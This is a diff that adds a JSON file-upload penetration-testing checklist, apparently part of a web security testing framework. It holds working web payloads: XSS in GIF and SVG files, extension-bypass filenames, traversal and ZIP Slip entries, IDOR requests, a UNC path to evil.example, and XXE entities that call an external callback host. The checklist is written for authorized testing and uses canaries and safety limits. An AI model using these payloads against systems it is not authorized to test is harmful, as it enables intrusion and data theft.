@@ -1,0 +1,243 @@
+{
+  "schema_version": "1.0.0",
+  "id": "file-upload",
+  "title": "File upload",
+  "summary": "Extension vs magic, executable content, SVG, filename traversal, download IDOR, ZIP Slip, and XXE in uploaded XML.",
+  "when": {
+    "features": [
+      "file_upload"
+    ]
+  },
+  "also_when": {},
+  "default_for": [],
+  "groups": [
+    {
+      "id": "accept",
+      "title": "What the server accepts",
+      "summary": "Type, name, and whether the file later executes or scripts.",
+      "checks": [
+        {
+          "id": "ext-mime-magic",
+          "title": "Extension, Content-Type, and magic",
+          "item": "WAPT-UPLOAD-002",
+          "related": [
+            "WAPT-UPLOAD-003",
+            "WAPT-UPLOAD-015"
+          ],
+          "severity": "high",
+          "why": "The server trusts one of the three and ignores the others.",
+          "validate": "A file that should be rejected is stored and later served or processed as that type.",
+          "variants": [
+            {
+              "name": "GIF magic, HTML name",
+              "kind": "note",
+              "payload": "Filename: note.html\\nContent-Type: image/gif\\nBody: GIF89a\\n<script>alert(1)</script>",
+              "expect": "If stored and served as HTML, that is stored XSS. Repeat with .svg, .xml, .pdf."
+            },
+            {
+              "name": "Double extension",
+              "kind": "note",
+              "payload": "note.php.jpg\\nnote.jpg.php\\nnote.phtml\\nnote.aspx\\nnote.jsp\\nnote.html.jpg",
+              "expect": "Normalization must run before the allowlist. A stored .php on an executable origin is critical."
+            },
+            {
+              "name": "NUL and trailing dot",
+              "kind": "note",
+              "payload": "note.php%00.jpg\\nnote.php.\\nnote.php::$DATA\\nnote.PHP",
+              "expect": "Legacy IIS/PHP tricks. Confirm the stored name, not only the upload response."
+            }
+          ]
+        },
+        {
+          "id": "exec-upload",
+          "title": "Uploaded file executes",
+          "item": "WAPT-UPLOAD-004",
+          "related": [
+            "WAPT-UPLOAD-005",
+            "WAPT-XSS-019"
+          ],
+          "severity": "critical",
+          "why": "The upload directory is inside an executable origin, or the app includes the file as code.",
+          "validate": "Requesting the stored URL runs server-side code or is served as active HTML from the app origin.",
+          "variants": [
+            {
+              "name": "Harmless marker script",
+              "kind": "note",
+              "payload": "<?php echo 'WAPT-UPLOAD-MARKER'; ?>\\n<% Response.Write(\"WAPT-UPLOAD-MARKER\") %>",
+              "expect": "Use a print-only marker, never a shell. If the URL prints the marker, stop and record."
+            },
+            {
+              "name": "Served as HTML",
+              "kind": "request",
+              "payload": "GET /uploads/<id>/note.html HTTP/1.1\nHost: www.example.com\nConnection: close",
+              "expect": "Content-Type must not be text/html on the app origin. Isolated file origin or attachment is the secure case."
+            }
+          ]
+        },
+        {
+          "id": "svg-xss",
+          "title": "SVG / active content",
+          "item": "WAPT-UPLOAD-014",
+          "related": [
+            "WAPT-XSS-015",
+            "WAPT-XSS-019"
+          ],
+          "severity": "high",
+          "why": "A user SVG is served inline from the app origin and runs script in the victim's session.",
+          "validate": "Opening the file URL as a document executes script in the application origin.",
+          "variants": [
+            {
+              "name": "SVG with script",
+              "kind": "note",
+              "payload": "<?xml version=\"1.0\"?>\\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\">\\n  <script>alert(1)</script>\\n</svg>",
+              "expect": "Upload as image.svg. Open the URL in the browser (not as <img>). Inline script on the app origin is the finding."
+            },
+            {
+              "name": "Content-Disposition",
+              "kind": "request",
+              "payload": "GET /uploads/<id>/image.svg HTTP/1.1\nHost: www.example.com\nConnection: close",
+              "expect": "attachment plus a non-HTML type, or a separate files origin, removes impact. nosniff should be set."
+            }
+          ]
+        },
+        {
+          "id": "filename-traversal",
+          "title": "Filename path traversal",
+          "item": "WAPT-UPLOAD-007",
+          "related": [
+            "WAPT-UPLOAD-006",
+            "WAPT-UPLOAD-019"
+          ],
+          "severity": "high",
+          "why": "The stored path joins the user filename onto a directory without canonicalizing.",
+          "validate": "The file lands outside the upload directory. On production use a canary path, not /etc/passwd.",
+          "variants": [
+            {
+              "name": "Dot-dot filename",
+              "kind": "note",
+              "payload": "filename: ../../wapt-canary.txt",
+              "expect": "The stored object must stay inside the upload root. Also try ..%2f and ....//."
+            },
+            {
+              "name": "Absolute and UNC",
+              "kind": "note",
+              "payload": "filename: /var/www/wapt-canary.txt\\nfilename: \\\\evil.example\\share\\wapt.txt",
+              "expect": "Absolute and UNC names must be rejected or stripped to the basename."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "retrieve",
+      "title": "Download, archives, XML",
+      "summary": "Who can fetch the object, ZIP Slip, and XXE in uploaded documents.",
+      "checks": [
+        {
+          "id": "download-idor",
+          "title": "Download authorization",
+          "item": "WAPT-UPLOAD-018",
+          "related": [
+            "WAPT-AUTHZ-010",
+            "WAPT-CLOUD-004"
+          ],
+          "severity": "high",
+          "why": "A guessed or swapped file id returns another user's object.",
+          "validate": "Account A retrieves B's file. Confirm the body, not only a 200.",
+          "variants": [
+            {
+              "name": "Swap the file id",
+              "kind": "request",
+              "payload": "GET /files/2002 HTTP/1.1\nHost: www.example.com\nCookie: session=<account-A>",
+              "expect": "2002 belongs to B. Also /api/v1/files/2002 and /download?id=2002."
+            },
+            {
+              "name": "Signed URL reuse",
+              "kind": "request",
+              "payload": "GET /files/2002?token=<expired-or-A-token> HTTP/1.1\nHost: files.example.com\nConnection: close",
+              "expect": "A signed URL must die after expiry and must not authorize a different object id."
+            }
+          ]
+        },
+        {
+          "id": "download-traversal",
+          "title": "Download path traversal",
+          "item": "WAPT-UPLOAD-019",
+          "related": [
+            "WAPT-UPLOAD-020",
+            "WAPT-HTTP-007"
+          ],
+          "severity": "high",
+          "why": "The download handler joins a user path onto a document root.",
+          "validate": "A traversal reads a file outside the intended directory. On production use a canary you placed.",
+          "variants": [
+            {
+              "name": "Dot-dot on download",
+              "kind": "request",
+              "payload": "GET /download?file=../../wapt-canary.txt HTTP/1.1\nHost: www.example.com\nCookie: session=<account-A>",
+              "expect": "The canary is returned. Stop after one confirmed read. Also try %2e%2e%2f."
+            },
+            {
+              "name": "Double-encoded",
+              "kind": "request",
+              "payload": "GET /files/..%252f..%252fwapt-canary.txt HTTP/1.1\nHost: www.example.com\nCookie: session=<account-A>",
+              "expect": "Edge decodes once, origin decodes again."
+            }
+          ]
+        },
+        {
+          "id": "zip-slip",
+          "title": "ZIP Slip / archive extract",
+          "item": "WAPT-UPLOAD-008",
+          "related": [
+            "WAPT-UPLOAD-009",
+            "WAPT-UPLOAD-010"
+          ],
+          "severity": "high",
+          "why": "An uploaded archive is extracted and an entry name walks out of the extract root.",
+          "validate": "A canary file you own is written or overwritten outside the extract directory. Do not overwrite system files.",
+          "variants": [
+            {
+              "name": "Traversal entry name",
+              "kind": "note",
+              "payload": "zipinfo style entry: ../../wapt-canary.txt\\nAlso: ..\\\\..\\\\wapt-canary.txt",
+              "expect": "Build a tiny zip with that entry name and a harmless marker body. Extract must refuse or stay inside the root."
+            },
+            {
+              "name": "Symlink entry",
+              "kind": "note",
+              "payload": "A symlink entry pointing at /tmp/wapt-canary.txt or a file you own.",
+              "expect": "Must be refused. Do not point a symlink at /etc/passwd on a shared host."
+            }
+          ]
+        },
+        {
+          "id": "xxe-upload",
+          "title": "XXE in uploaded XML / Office / SVG",
+          "item": "WAPT-INJ-021",
+          "related": [
+            "WAPT-INJ-022",
+            "WAPT-UPLOAD-013"
+          ],
+          "severity": "critical",
+          "why": "A parser that accepts the upload resolves external entities.",
+          "validate": "A callback on a host you control is fetched, or a canary file you placed is returned. Never harvest /etc/passwd on production.",
+          "variants": [
+            {
+              "name": "Classic external entity",
+              "kind": "note",
+              "payload": "<?xml version=\"1.0\"?>\\n<!DOCTYPE wapt [\\n  <!ENTITY xxe SYSTEM \"https://unique.oast.example/xxe\">\\n]>\\n<root>&xxe;</root>",
+              "expect": "Upload as .xml / .svg / .docx (word/document.xml). An outbound hit on your listener is the finding."
+            },
+            {
+              "name": "Parameter entity / DTD",
+              "kind": "note",
+              "payload": "<?xml version=\"1.0\"?>\\n<!DOCTYPE wapt [\\n  <!ENTITY % dtd SYSTEM \"https://unique.oast.example/xxe.dtd\">\\n  %dtd;\\n]>",
+              "expect": "Same listener check. Disable external DTD loading is the control."
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
